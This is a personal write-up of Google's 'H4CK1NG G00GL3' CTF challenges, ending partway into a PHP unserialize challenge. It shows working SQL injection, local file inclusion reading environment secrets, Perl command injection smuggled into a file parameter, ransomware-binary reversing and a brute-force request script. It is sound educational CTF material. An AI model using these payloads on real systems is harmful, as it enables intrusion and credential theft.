# H4CK1NG G00GL3 - Main challenges write-up

_London, October 2022_

## Table Of Contents

- [H4CK1NG G00GL3 - Main challenges write-up](#h4ck1ng-g00gl3---main-challenges-write-up)
  - [Table Of Contents](#table-of-contents)
  - [Intro](#intro)
  - [EP000 - Operation Aurora](#ep000---operation-aurora)
    - [CHALLENGE 01](#challenge-01)
      - [Solution](#solution)
    - [CHALLENGE 02](#challenge-02)
      - [Solution](#solution-1)
  - [EP001 - T.A.G](#ep001---tag)
    - [CHALLENGE 01](#challenge-01-1)
      - [Solution](#solution-2)
    - [CHALLENGE 02](#challenge-02-1)
      - [Solution](#solution-3)
      - [Random ideas on how to so solve this challenge in a more elegant way](#random-ideas-on-how-to-so-solve-this-challenge-in-a-more-elegant-way)
    - [CHALLENGE 03](#challenge-03)
      - [Solution](#solution-4)
  - [EP002 - Detection and Response](#ep002---detection-and-response)
    - [CHALLENGE 01](#challenge-01-2)
      - [Solution](#solution-5)
    - [CHALLENGE 02](#challenge-02-2)
      - [Solution](#solution-6)
    - [CHALLENGE 03](#challenge-03-1)
      - [Solution](#solution-7)
  - [EP003 - Red Team](#ep003---red-team)
    - [CHALLENGE 01](#challenge-01-3)
      - [Solution](#solution-8)
    - [CHALLENGE 02](#challenge-02-3)
      - [Solution](#solution-9)
    - [CHALLENGE 03](#challenge-03-2)
      - [Solution](#solution-10)
  - [EP004 - Bug Hunters](#ep004---bug-hunters)
    - [CHALLENGE 01](#challenge-01-4)
      - [Solution](#solution-11)
    - [CHALLENGE 02](#challenge-02-4)
      - [Solution](#solution-12)
    - [CHALLENGE 03](#challenge-03-3)
      - [Solution](#solution-13)
  - [EP005 - Project Zero](#ep005---project-zero)
    - [CHALLENGE 01](#challenge-01-5)
      - [Solution](#solution-14)
    - [CHALLENGE 02](#challenge-02-5)
      - [Solution](#solution-15)
    - [CHALLENGE 03](#challenge-03-4)
      - [Solution](#solution-16)

---

## Intro

[Hacking Google](https://h4ck1ng.google/home) is a _sui generis_ CTF and, hands down, my favourite CTF so far.

According to the authors:

> This is a game, of sorts. H4CKING GOOGL3 is a series of "capture the flag" (CTF) challenges based on the HACKING GOOGLE series. The only way to beat this game designed for hackers, is to think like one.

The [series of videos](https://www.youtube.com/watch?v=aOGFY1R4QQ4&) introducing the challenges are real documentaries, professionally filmed and directed. Each video introduces a cybersecurity topic. Each episode has an introductory challenge and 2 or 3 CTF challenges, plus a bonus one.

The challenges are non-trivial and, typically, not solvable with readily available tools (e.g., using frameworks, or exploits for known vulnerabilities). The best part is that they are all designed to teach you something. In fact, you will have to build your own tools, understand thoroughly the systems you are dealing with, and the properties and vulnerabilities of security mechanisms at play.

In the following write-up, I am summarizing how I, personally, solved the 17 main challenges. While doing so, I will try, as much as possible, to explain my reasoning and mental processes that led me to each exploitation.

Where applicable, I provide the source code of the scripts I have been using.

Note: the reader should keep in mind that there are multiple ways to crack each challenge. Sometimes probably more efficient and elegant than what I am showing here :)

## EP000 - Operation Aurora

The theme for this episode is the historical series of cyberattacks conducted by advanced persistent threats such as the Elderwood Group based in Beijing, China, with ties to the People's Liberation Army.

The attack was aimed at dozens of other organizations, including Google, between mid-2009 and Jan 2010.

### CHALLENGE 01

> A clean and fair game of chess. Careful though, this is not a game for grandmasters to win.
>
> Hint: Don't make this game harder than it needs to be.

As the description states, you need to "win" a chess game. Unfortunately, the game is anything but fair: after the first few moves, all the opponents pawns will turn into queens. Check mate.

Clicking on the link, we get to [the check board](https://hackerchess-web.h4ck.ctfcompetition.com).

#### Solution

This game is full of bugs. Moreover, changing the difficulty won't have any noticeable effect :)

There is an SQL injection in the "master login" page.

Use username `master` and password `'or'x'='x` to get access to the admin page. Here is an example with cURL, you will have to use the browser.

```shell
❯ curl 'https://hackerchess-web.h4ck.ctfcompetition.com/admin.php' -X POST \
    --data 'username=master&password=%27or%27x%27%3D%27x'

<html>
<head>
    <title>Secret Admin Panel</title>
<script
    data-autoload-cookie-consent-bar="true"
    data-autoload-cookie-consent-bar-intl-code=""
    src="https://www.gstatic.com/brandstudio/kato/cookie_choice_component/cookie_consent_bar.v3.js">
</script>
<!-- Global site tag (gtag.js) - Google Analytics -->
<script async src="https://www.googletagmanager.com/gtag/js?id=G-06YS0MVC8B"></script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());
    gtag('config', 'G-06YS0MVC8B', { anonymize_ip: true, referrer: document.referrer.split('?')[0] });
    </script>

</head>
<body>


Logged in successfully!</body>
</html>
```

You can use this panel to turn off cheats, but that is not how you are going to win properly the game 🙂(i.e., you don't need to leverage this SQL injection to solve the challenge).

***Never forget to look at the source!***

Looking at the game main HTML page, I noticed a weird script:

```javascript
function load_baseboard() {
  const url = "load_board.php"
  let xhr = new XMLHttpRequest()
  const formData = new FormData();
  formData.append('filename', 'baseboard.fen')

  xhr.open('POST', url, true)
  xhr.send(formData);
  window.location.href = "index.php";
}
```

The load_baseboard() function is called when the START button is pressed.

```html
<button id="start" onclick="load_baseboard()"></button>
```

It sends a http POST request in background, using the `filename` parameter.

```shell
❯ curl 'http://hackerchess-web.h4ck.ctfcompetition.com/load_board.php' -X POST \
    --data 'filename=baseboard.fen'
Loading Fen: rnbqkbnr/pppppppp/8/8/8/8/PPPPPPPP/RNBQKBNR w KQkq - 0 1
```

Tweaking the value of this parameter, we get an empty reply. BUT, trying some well-known file on Linux, we get its content :)

```shell
❯ curl 'http://hackerchess-web.h4ck.ctfcompetition.com/load_board.php' -X POST \
    --data 'filename=/etc/issue' --output -
Loading Fen: Ubuntu 20.04 LTS \n \l
```

This means we have a (straightforward to exploit) [local file inclusion](https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/07-Input_Validation_Testing/11.1-Testing_for_Local_File_Inclusion) (LFI).

One of the first thing to do when you have an LFI is learning who you are and where you are. This can be done including `/proc/self/environ` :

```shell
❯ curl -s 'http://hackerchess-web.h4ck.ctfcompetition.com/load_board.php' -X POST \
    --data 'filename=/proc/self/environ' --output - | tr '\0' '\n' | head -10
Loading Fen: SERVER_NAME=hackerchess-web.h4ck.ctfcompetition.com
REDIRECT_DB_PASSWORD=***REDACTED***
REDIRECT_DB_HOST=chess-ai-mysql
SCRIPT_NAME=/cgi-bin/nsjail-php-cgi
REDIRECT_STATUS=200
GATEWAY_INTERFACE=CGI/1.1
REDIRECT_FLAG=https://h4ck1ng.google/solve/**REDACTED***
SERVER_SOFTWARE=Apache/2.4.41 (Ubuntu)
PATH_INFO=/load_board.php
DOCUMENT_ROOT=/web-apps/php
```

And here is my flag! Along with it, we get the DB password, and some juicy information about the technology used on the system… how cool is that?! >:D

### CHALLENGE 02

> After recent attacks, we've developed a search tool. Search the logs and discover what the attackers were after.
>
> Hint: Always search deeper.

[This log search](https://aurora-web.h4ck.ctfcompetition.com) tool looks very basic.

#### Solution

We have a dropdown menu with a selection of files and a text box where we can put the search term. Looking at the source, we learn that clicking on the search button, the browser will issue a GET to the server, using this JavaScript:

```javascript
function search() {
  const file = document.getElementById("files").value;
  const term = document.getElementById("searchterm").value;
  const url = document.location.origin + "?file=" + escape(file) + "&term=" + escape(term);

  if (term.length < 4) {
    alert("Search term must be at least 4 characters long!");
    return;
  }

  document.getElementById("found").value = "Loading...";

  const xhr = new XMLHttpRequest();
  xhr.onload = function() {
    document.getElementById("found").value = xhr.responseText;
  }
  xhr.open("GET", url);
  xhr.send();
}
```

We can, of course, ignore everything in this function and just craft our own GET request, although the minimum length of `term` value is actually enforced on the server:

```shell
❯ curl 'https://aurora-web.h4ck.ctfcompetition.com/?file=hexdump.txt&term=aur'
(nothing)
❯ curl 'https://aurora-web.h4ck.ctfcompetition.com/?file=hexdump.txt&term=auro'
0001bd20  d2 04 69 98 10 00 00 00  66 3a 5c 41 75 72 6f 72  |..i.....f:\Auror|
0001bd30  61 5f 53 72 63 5c 41 75  72 6f 72 61 56 4e 43 5c  |a_Src\AuroraVNC\|
```

After tinkering with the `file` parameter, I discovered a path traversal vulnerability, which is tricky to exploit because we need to know at least 4 characters of the text we want to display:

```shell
❯ curl 'https://aurora-web.h4ck.ctfcompetition.com/?file=../../etc/issue&term=bunt'
Ubuntu 20.04 LTS \n \l
```

Now, we need to find the flag... Let's search the environment first:

```shell
❯ curl -s 'https://aurora-web.h4ck.ctfcompetition.com/?file=../../proc/self/environ&term=http' \
    --output - | tr '\0' '\n'
SERVER_NAME=aurora-web.h4ck.ctfcompetition.com
SCRIPT_NAME=/cgi-bin/nsjail-perl-cgi
[...]
REDIRECT_URL=/index.pl
[...]
```

Unfortunately, no flag here, but we can see something quite interesting: this is a GCI script, using Perl.

That almost immediately rang a bell: *what if this thing uses Perl `open()` ?*

That would be particularly 'handy' as that function can actually [execute programs](https://stackoverflow.com/questions/27084779/perl-code-pipe-in-open-statement).

```shell
❯ time curl -G 'https://aurora-web.h4ck.ctfcompetition.com/' \
    --data-urlencode 'file=hexdump.txt;sleep 3|' \
    --data-urlencode 'term=auro'

curl -G 'https://aurora-web.h4ck.ctfcompetition.com/' --data-urlencode     0.01s user 0.01s system 0% cpu 3.357 total
```

BINGO :)

How can we exploit this? Just by using some creativity… and, after few trial-error iterations:

```shell
❯ curl -s -G 'https://aurora-web.h4ck.ctfcompetition.com/' \
    --data-urlencode 'file=hexdump.txt;ls -l /|tr "\n" "\0"|xargs -0 -n1 echo "****"|' \
    --data-urlencode 'term=****'
**** total 56
**** lrwxrwxrwx   1 nobody nogroup    7 Jul 20  2020 bin -> usr/bin
**** drwxr-xr-x   2 nobody nogroup 4096 Apr 15  2020 boot
**** drwxr-xr-x   5 nobody nogroup  360 Oct 13 08:53 dev
**** drwxr-xr-x  47 nobody nogroup 4096 Aug 18 12:12 etc
**** -rw-r--r--   1 nobody nogroup   52 Aug 18 12:08 flag
**** drwxr-xr-x   2 nobody nogroup 4096 Apr 15  2020 home
**** lrwxrwxrwx   1 nobody nogroup    7 Jul 20  2020 lib -> usr/lib
**** lrwxrwxrwx   1 nobody nogroup    9 Jul 20  2020 lib32 -> usr/lib32
**** lrwxrwxrwx   1 nobody nogroup    9 Jul 20  2020 lib64 -> usr/lib64
**** lrwxrwxrwx   1 nobody nogroup   10 Jul 20  2020 libx32 -> usr/libx32
**** drwxr-xr-x   2 nobody nogroup 4096 Jul 20  2020 media
**** drwxr-xr-x   2 nobody nogroup 4096 Jul 20  2020 mnt
**** drwxr-xr-x   2 nobody nogroup 4096 Jul 20  2020 opt
**** dr-xr-xr-x 639 nobody nogroup    0 Oct 14 21:27 proc
**** drwx------   3 nobody nogroup 4096 Aug 18 12:12 root
**** drwxr-xr-x   8 nobody nogroup 4096 Aug 18 12:12 run
**** lrwxrwxrwx   1 nobody nogroup    8 Jul 20  2020 sbin -> usr/sbin
**** drwxr-xr-x   2 nobody nogroup 4096 Jul 20  2020 srv
**** drwxr-xr-x   2 nobody nogroup 4096 Apr 15  2020 sys
**** drwxrwxrwt   2 user   user      40 Oct 14 21:27 tmp
**** drwxr-xr-x  14 nobody nogroup 4096 Aug 18 12:12 usr
**** drwxr-xr-x  11 nobody nogroup 4096 Jul 20  2020 var
**** drwxr-xr-x   1 nobody nogroup 4096 Sep 30 09:00 web-apps
```

Note the 4 asterisks (`****`). These are only useful to make sure each line of the output is matched.

Here is our flag! We can retrieve either with a `cat /flag` or, since we know how it looks like, just by fully leverage the power of our search engine! 🤣

```shell
❯ curl 'https://aurora-web.h4ck.ctfcompetition.com/?file=../../flag&term=http'
https://h4ck1ng.google/solve/***REDACTED***
```

## EP001 - T.A.G

This episode is about Threat Analysis and being vigilant on cyberattacks, preventing them :)

### CHALLENGE 01

> Your files have been compromised, get them back.
>
> Hint: Find a way to make sense of it.

The link downloads a tar file with a statically-linked executable and a data file, presumably containing our flag:

```shell
❯ ls -la
total 6448
drwx------@ 4 davide  staff      128 14 Oct 22:39 .
drwxr-xr-x  5 davide  staff      160 14 Oct 22:39 ..
-rw-r-----@ 1 davide  staff      256  7 Sep 11:45 flag
-rwxr-x---@ 1 davide  staff  3294254  1 Oct 04:17 wannacry
❯ file wannacry
wannacry: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, Go BuildID=IGPSbKhPf45BQqlR84-9/XWC3eVS4fozNp9uK4nDp/_Styn3U-Z8S6ExnY6QOR/RTzNS5QnFmUHeSBeyHIu, with debug_info, not stripped
❯ xxd flag
00000000: 94c8 902f f743 26e3 2237 ff94 a713 88b3  .../.C&."7......
00000010: 2b3c fd6e 4dc1 2c41 56b4 f94b 188f a64c  +<.nM.,AV..K...L
00000020: 8b28 a09c f764 00a1 51a3 b2f9 ebf3 0e20  .(...d..Q......
00000030: 34ef 8f04 425d 77be 2acb 70ad 5da1 6e91  4...B]w.*.p.].n.
00000040: 4528 141e c889 dd7d f19d b5ce 1652 89d4  E(.....}.....R..
00000050: a2af cdab b4eb 1b6d f8e7 0591 9057 3d4e  .......m.....W=N
00000060: 5105 439a 948a f3f8 35eb 83a4 31a0 bd4f  Q.C.....5...1..O
00000070: 5586 b9a4 f0bb cde4 7469 ba76 d3d5 f58e  U.......ti.v....
00000080: dd6f c390 8723 12cc a2be cea5 c067 001a  .o...#.......g..
00000090: bea7 674c bbc0 f096 3b60 e9b0 c3ac de56  ..gL....;`.....V
000000a0: 1d37 304b 1ad0 9669 ca63 4549 54ad c88e  .70K...i.cEIT...
000000b0: 7892 ba79 ed5f 6604 5249 53b6 b1e8 373f  x..y._f.RIS...7?
000000c0: 98d8 d4f3 c053 e7d0 b728 9c05 3b9f be4c  .....S...(..;..L
000000d0: 0262 8191 2dbf 01ce f569 08aa 067d 0fd4  .b..-....i...}..
000000e0: beb9 b170 e2fc abe9 1132 26cc 4af1 7f75  ...p.....2&.J..u
000000f0: a8b6 da0b 11ba a45b 6d24 2353 e500 5350  .......[m$#S..SP
```

#### Solution

Given the topic of this episode and the name of our executable ([WannaCry](https://en.wikipedia.org/wiki/WannaCry_ransomware_attack) was a ransomware attack), chances are that `flag` is encrypted.

So, in this case, we need to analyse `wannacry`. Since you don't want to actually cry, *always run untrusted stuff in an isolated sandbox*.

Personally, I use Docker, with an image I built specifically for CTFs. You can find it [here](https://gist.github.com/dguerri/020830af10b274ca4eeada2fc320e3fb). Note that the software installed there is overkill for the challenge at hand.

```shell
❯ ./wannacry
Usage of ./wannacry:
  -encrypted_file string
        File name to decrypt.
  -key_file string
        File name of the private key.
```

So, our executable wants a key and the encrypted file… we can either pay the ransom or… look at the binary.

Passing some rubbish as the key, we learn that the executable wants a PEM encoded key, which is most certainly a symmetric key.

```shell
❯ ./wannacry -encrypted_file ./flag -key_file key
2022/10/14 21:51:09 failed to read the PEM block from the key file
```

Let's look at the code using [`Radare 2`](https://rada.re/n/):

```shell
❯ r2 wannacry  # This will take a long time (go binary) 
 -- Bindiff two files with '$ radiff2 /bin/true /bin/false'
[0x00462ae0]> aa
INFO: Analyze all flags starting with sym. and entry0 (aa)
INFO: Analyze all functions arguments/locals
[0x00462ae0]> afl|grep main
0x00436160   34    793 sym.runtime.main
0x00436480    5     53 sym.runtime.main.func2
0x0045b6e0    3     58 sym.runtime.main.func1
0x00509020   11    606 sym.main.decrypt
0x00509280   15    389 sym.main.readKey
0x00509420    7     80 sym.main.impossible
0x00509480   22    499 sym.main.main
0x00509680    9    197 sym.main.init
[0x00462ae0]> pdfs @sym.main.main
0x00509480:
0x00509498 call sym.main.impossible
0x005094aa "Keys are here:.https://wannacry-keys-***REDACTED***/.reflect.Value.Interface: cannot return value obtained from unexported field or methodx509: failed to parse private key (use ParseECPrivateKey instead for this key format)reflect: New of type that may not be allocated in heap (possibly undefined cgo C type)x509: failed to parse private key (use ParsePKCS1PrivateKey instead for this key format)x509: failed to parse private key (use ParsePKCS8PrivateKey instead for this key format)3617de4a96262c6f5d9e98bf9292dc29f8f41dbd289a147ce9da3113b5f0b8c00a60b1ce1d7e819d7a431d7c90ea0e5faa87ca22be8b05378eb1c71ef320ad746e1d3b628ba79b9859f741e082542a385502f25dbf55296c3a545e3872760ab7b3312fa7e23ee7e4988e056be3f82d19181d9c6efe814112031" ; "Keys are here:\nhttps://wannacry-keys-dot-gweb-h4ck1ng-g00gl3.uc"
0x005094b8 call sym.runtime.convTstring
0x005094d5 obj.go:itab.os.File_io.Writer
0x005094e9 call sym.fmt.Fprintln
[...]
```

Oh, wow. In retrospective, probably a carefully crafted `strings/grep` on `./wannacry` would suffice... Anyway, we have a lead:

```text
0x005094aa "Keys are here:.https://wannacry-keys-***REDACTED***/.<blah blah>
```

The URL above brings us to a directory full of PEM keys… which one is the right one?

Since there are only 200 keys, let's download them all:

```shell
❯ curl -s https://wannacry-keys-***REDACTED***/|grep pem|wc -l
200

❯ wget --no-parent --reject "*.html" -r https://wannacry-keys-***REDACTED***/
[...]
```

and try each one:

```shell
❯ for key in wannacry-keys-***REDACTED***/*.pem; do \
    ./wannacry -key_file "$key" -encrypted_file ./flag; echo; \
  done | grep -ai http
https://h4ck1ng.google/solve/***REDACTED***
```

YEAH! :)

Even if the challenge was solved, I went on analysing the program, since this call to `sym.main.impossible` caught my attention.

Apparently, the program voluntarily gives you the above URL if that function returns `true` (i.e., non-zero in C):

```asm
[0x00462ae0]> pdf @sym.main.main
[...]
│      │╎   0x00509498      e883ffffff     call sym.main.impossible
│      │╎   0x0050949d      0f1f00         nop dword [rax]
│      │╎   0x005094a0      84c0           test al, al
│     ╭───< 0x005094a2      744a           je 0x5094ee
│     ││╎   0x005094a4      440f117c2448   movups xmmword [var_48h], xmm15
│     ││╎   0x005094aa      488b052ff810.  mov rax, qword [obj.main.site] ; [0x618ce0:8]=0x53a7a4 "Keys are here:.https://wannacry-keys-[...]"
│     ││╎   0x005094b1      488b1d30f810.  mov rbx, qword [0x00618ce8] ; [0x618ce8:8]=79
│     ││╎   0x005094b8      e8e32cf0ff     call sym.runtime.convTstring
│     ││╎   0x005094bd      488d0d7cbb00.  lea rcx, [0x00515040]
│     ││╎   0x005094c4      48894c2448     mov qword [var_48h], rcx
│     ││╎   0x005094c9      4889442450     mov qword [var_50h], rax
│     ││╎   0x005094ce      488b1dc37011.  mov rbx, qword [obj.os.Stdout] ; [0x620598:8]=0
│     ││╎   0x005094d5      488d05642d06.  lea rax, obj.go:itab.os.File_io.Writer ; 0x56c240 ; " \xb7Q"
│     ││╎   0x005094dc      488d4c2448     lea rcx, [var_48h]
│     ││╎   0x005094e1      bf01000000     mov edi, 1
│     ││╎   0x005094e6      4889fe         mov rsi, rdi
│     ││╎   0x005094e9      e83224f9ff     call sym.fmt.Fprintln
[...]
```

`sym.main.impossible` just checks if the current date/time matches some hardcoded one.

This information has not been useful in this occasion but, as it turned out, it was useful later :)

### CHALLENGE 02

> Can you find a way to stop the hackers that encrypted your data?
>
> Hint: Find a way to switch it off.

Again, we are given a file, named `wannacry`. This time, we have a dynamically-linked executable.

```text
wannacry: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=0c23340ab6c6d0c158f0ee356a1deb0253d8cf4c, for GNU/Linux 3.2.0, not stripped
```

#### Solution

Let's fire up Radare 2 and analyse the binary:

```asm
❯ r2 ./wannacry
Warning: run r2 with -e bin.cache=true to fix relocations in disassembly
 -- Find wide-char strings with the '/w <string>' command
[0x0002f0b0]> aa
INFO: Analyze all flags starting with sym. and entry0 (aa)
INFO: Analyze all functions arguments/locals
[0x0002f0b0]> afl
0x0002f0b0    1     42 entry0
0x0002f0e0    4     34 sym.deregister_tm_clones
0x0002f110    4     51 sym.register_tm_clones
0x0002f150    5     54 sym.__do_global_dtors_aux
0x0002f0a0    1      6 sym.imp.__cxa_finalize
0x0002f190    1      9 entry.init0
0x0002f000    3     23 sym._init
0x0002f8f0    1      1 sym.__libc_csu_fini
0x0002f5ca    4     45 sym.count_ones
0x0002f8f4    1      9 sym._fini
0x0002f78e    6    137 sym.correct_code
0x0002f817    1     95 sym.print
0x0002f050    1      6 sym.imp.strlen
0x0002f040    1      6 sym.imp.write
0x0002f890    4     93 sym.__libc_csu_init
0x0002f876    1     18 main
0x0002f6c4    4    131 sym.time_now
0x0002f29c   29    814 sym.sha1_hash
0x0002f199    1     27 sym.sha1_rotate
0x0002f747    1     71 sym.totp
0x0002f5f7   10    205 sym.extract31
0x0002f1b4    6    232 sym.sha1_preprocess
0x0002f030    1      6 sym.imp.free
0x0002f060    1      6 sym.imp.memset
0x0002f070    1      6 sym.imp.memcpy
0x0002f080    1      6 sym.imp.time
0x0002f090    1      6 sym.imp.malloc
[0x0002f0b0]> pdf @ main
            ; DATA XREF from entry0 @ 0x2f0cd(r)
╭ 18: int main (int argc, char **argv);
│           ; arg int argc @ rdi
│           ; arg char **argv @ rsi
│           ; var int64_t var_4h @ rbp-0x4
│           ; var int64_t var_10h @ rbp-0x10
│           0x0002f876      55             push rbp
│           0x0002f877      4889e5         mov rbp, rsp
│           0x0002f87a      897dfc         mov dword [var_4h], edi     ; argc
│           0x0002f87d      488975f0       mov qword [var_10h], rsi    ; argv
│           0x0002f881      b800000000     mov eax, 0
│           0x0002f886      5d             pop rbp
╰           0x0002f887      c3             ret
```

Mmmh, it looks like our main function just returns. But, again, we have some interesting functions in the binary:

```asm
[0x0002f0b0]> axt @ sym.correct_code
sym.print 0x2f824 [CALL:--x] call sym.correct_code
[0x0002f0b0]> pdf @ sym.print
╭ 95: sym.print ();
│           ; var int64_t var_8h @ rbp-0x8
│           0x0002f817      55             push rbp
│           0x0002f818      4889e5         mov rbp, rsp
│           0x0002f81b      4883ec10       sub rsp, 0x10
│           0x0002f81f      b800000000     mov eax, 0
│           0x0002f824      e865ffffff     call sym.correct_code
│           0x0002f829      488945f8       mov qword [var_8h], rax
│           0x0002f82d      488b052c0b02.  mov rax, qword [obj.DOMAIN] ; [0x50360:8]=0x3f2c8 str.https:__wannacry_killswitch_dot_**REDACTED**__
│           0x0002f834      4889c7         mov rdi, rax
│           0x0002f837      e814f8ffff     call sym.imp.strlen         ; size_t strlen(const char *s)
│           0x0002f83c      4889c2         mov rdx, rax
│           0x0002f83f      488b051a0b02.  mov rax, qword [obj.DOMAIN] ; [0x50360:8]=0x3f2c8 str.https:__wannacry_killswitch_dot_**REDACTED**__
│           0x0002f846      4889c6         mov rsi, rax
│           0x0002f849      bf01000000     mov edi, 1
│           0x0002f84e      e8edf7ffff     call sym.imp.write          ; ssize_t write(int fd, const char *ptr, size_t nbytes)
│           0x0002f853      488b45f8       mov rax, qword [var_8h]
│           0x0002f857      4889c7         mov rdi, rax
│           0x0002f85a      e8f1f7ffff     call sym.imp.strlen         ; size_t strlen(const char *s)
│           0x0002f85f      4889c2         mov rdx, rax
│           0x0002f862      488b45f8       mov rax, qword [var_8h]
│           0x0002f866      4889c6         mov rsi, rax
│           0x0002f869      bf01000000     mov edi, 1
│           0x0002f86e      e8cdf7ffff     call sym.imp.write          ; ssize_t write(int fd, const char *ptr, size_t nbytes)
│           0x0002f873      90             nop
│           0x0002f874      c9             leave
╰           0x0002f875      c3             ret
```

The code seems to refer to some sort of kill-switch. The hint provided is also suggesting that we need to 'switch it off'.

Note that this challenge is clearly inspired to the real WannaCry story, and [its kill switch feature](https://en.wikipedia.org/wiki/WannaCry_ransomware_attack#Defensive_response):

> [the attack] was halted a few hours later at 15:03 UTC by the registration of a kill switch discovered by Marcus Hutchins.

Anyway, let's get back to work:

```asm
[0x0002f0b0]> ps @ 0x3f2c8
https://wannacry-killswitch-dot-**REDACTED**//
```

Too easy 😀 or so I though...

```shell
❯ curl https://wannacry-killswitch-dot-**REDACTED**/
Our princess is in another castle.#
```

Oh, noes!!!

BUT! As we can see in the code, the output of `sym.correct_code` (presumably a pointer) is put in `[var_8h]`, which seems to be later used by `write()` to add a suffix to our kill-switch URL.

I will spare you from the analysis of the code, just mentioning that the disasm of `sym.correct_code` contains a reference to `obj.wordlist`. A word is picked from this list and appended to the above URL.

```text
[0x5601d49e2876]> px @ [obj.wordlist]
- offset -       8 9  A B  C D  E F 1011 1213 1415 1617  89ABCDEF01234567
0x5601d49e3008  6162 6163 7573 0061 6264 6f6d 656e 0061  abacus.abdomen.a
0x5601d49e3018  6264 6f6d 696e 616c 0061 6269 6465 0061  bdominal.abide.a
0x5601d49e3028  6269 6469 6e67 0061 6269 6c69 7479 0061  biding.ability.a
0x5601d49e3038  626c 617a 6500 6162 6c65 0061 626e 6f72  blaze.able.abnor
0x5601d49e3048  6d61 6c00 6162 7261 7369 6f6e 0061 6272  mal.abrasion.abr
0x5601d49e3058  6173 6976 6500 6162 7265 6173 7400 6162  asive.abreast.ab
0x5601d49e3068  7269 6467 6500 6162 726f 6164 0061 6272  ridge.abroad.abr
[...]
```

Reading the code, it seems that a specific word is chosen based on the SHA1 hash of local time (see `sym.totp`) and the number of 1s in the resulting string.

I decided to stop my investigation, dump the dictionary, and use the brute force (sorry Google…).

```shell
[0x5601d49e2876]> izz | grep -e '^[0-9]*\s0x000[a-f0-9]*\s[0-9]*\s*[0-9]*.*\.rodata\s*ascii'|awk '{print $NF}' > dictionary.txt
```

and then I wrote a simple Python script using [Requests](https://pypi.org/project/requests/) and a thread pool to search for the flag 🙂

```python
#!/usr/bin/env python3

from multiprocessing.pool import ThreadPool
import requests

BASE_URL = "https://wannacry-killswitch-dot-**REDACTED**/"

def build_url(term):
    return f"{BASE_URL}/{term}"


with open("dictionary.txt", "r") as text_file:
    dictionary = text_file.read().split('\n')

pool = ThreadPool(processes=30)
async_results = [
    pool.apply_async(requests.get, (build_url(word),))
    for word in dictionary
]

for ar in async_results:
    result = ar.get()
    if "another castle" not in result.text:
        print(result.text)
```

The server-side code probably shares client's logic, as the "right" code changes in time. Thus, the script might fail if the flag changes while it's running.

```html
❯ ./ep001ch02.py

<html>
  <head>
    <meta charset="utf-8">
    <title>Turn it off!</title>
    <style>
[...]
    </style>
  </head>
  <body>
    <div class="container">
      <div class="btn" onclick="document.getElementById('txt').style.visibility='visible'">Turn it off!</div>
      <div id="txt">https://h4ck1ng.google/solve/**REDACTED**</div>
[...]
  </body>
</html>
```

#### Random ideas on how to so solve this challenge in a more elegant way

1. complete the understanding of `wannacry` logic and simulate it;
2. patch the executable in memory, and make it call `sym.print`;
3. return to win: put the runtime address of `sym.print` on top of the stack of `main`;
4. decompile the binary (e.g., with [Ghidra](https://github.com/NationalSecurityAgency/ghidra)), insert a call to `sym.print`, [re-compile it](https://github.com/NationalSecurityAgency/ghidra/issues/236), and run it.

Solutions 2-4 requires running the binary, of course. In general, this is not a good idea (unless you are using a well isolated sandbox, with no access to the Internet), but in this particular case you know exactly what you are running :)

### CHALLENGE 03

> Your opponents are always learning. They'll keep coming back stronger.
>
> Hint: Opponents patch their vulnerabilities, too. The same strategy won't work twice.

The link brings us to the same chess game we hacked in EP000CH01.

Unfortunately, this time there is no SQL injection we can use (admin page is not present).

Moreover, although the JavaScript code we came across in EP000CH01 is still in the page, the vulnerability in the board loader API has been fixed.

```shell
❯ curl 'https://hackerchess2-web.h4ck.ctfcompetition.com/load_board.php' -X POST \
    --data 'filename=/etc/issue' --output -
unsupported board
```

#### Solution

Getting back to the game, I noticed that the first time you click on one of your pieces, the browser will load the page passing the clicked coordinates. For instance:

```text
https://hackerchess2-web.h4ck.ctfcompetition.com/index.php?move_start=e2
```

The game now shows the next possible moves. When is clicked, the browser loads a page with a base64 encoded `move_end` parameter. For instance:

```text
https://hackerchess2-web.h4ck.ctfcompetition.com/?move_end=YToyOntpOjA7czoyOiJkMiI7aToxO3M6MjoiZDQiO30=
```

If we decode the b64, we get something like:

```shell
❯ echo "YToyOntpOjA7czoyOiJkMiI7aToxO3M6MjoiZDQiO30=" | base64 -d
a:2:{i:0;s:2:"d2";i:1;s:2:"d4";}
```

At first, I couldn't see anything interesting here, and I was a bit lost.

Then I remembered that I had full access to the source code in EP000CH01. Since this version of the game is just a patched version of that one, I downloaded its source:

```php
❯ curl -s 'http://hackerchess-web.h4ck.ctfcompetition.com/load_board.php' -X POST \
    --data 'filename=./index.php' --output -
Loading Fen: <?php
session_save_path('/mnt/disks/sessions');
session_start();
if (isset($_GET['restart'])) {
    session_destroy();
    header("Location: ". "/");
}
[...]
```

I opened the code in my favourite editor and found few interesting facts:

- this web application is a wrapper around the CLI game `/usr/games/stockfish`;

```php
[...]
class Stockfish
{
    public $cwd = "./";
    public $binary = "/usr/games/stockfish";
    public $other_options = array('bypass_shell' => 'true');
    public $descriptorspec = array(
        0 => array("pipe","r"),
                1 => array("pipe","w"),
    );
    private $process;
    private $pipes;
    private $thinking_time;

    public function __construct()
    {
        $other_options = array('bypass_shell' => 'true');
        //echo "Stockfish options" . $_SESSION['thinking_time'];
        if (isset($_SESSION['thinking_time']) && is_numeric($_SESSION['thinking_time'])) {
            $this->thinking_time = $_SESSION['thinking_time'];
            echo '<!-- getting thinking time from admin.php -->';
            echo '<!-- setting thinking time to ' . $this->thinking_time . '-->';
        } else {
            $this->thinking_time = 10;
        }
        $this->process = proc_open($this->binary, $this->descriptorspec, $this->pipes, $this->cwd, null, $this->other_options) ;
[...]
```

- the executable path is stored in a variable named `$binary`;
- commands are sent to the game via a pipe;

```php
public function passPosition(string $fen)
{
    fwrite($this->pipes[0], "position fen $fen\n");
    fwrite($this->pipes[0], "go movetime $this->thinking_time\n");
}
```

- finally, I searched for any `$_GET` or `$_POST` use… and this showed up!

```php
$output = new MyHtmlOutput();
if (isset($_GET['move_start'])) {
    echo $output->render($chess, $_GET['move_start']);
} elseif (isset($_GET['move_end'])) {
    $movei = unserialize(base64_decode($_GET['move_end']));
[...]
```

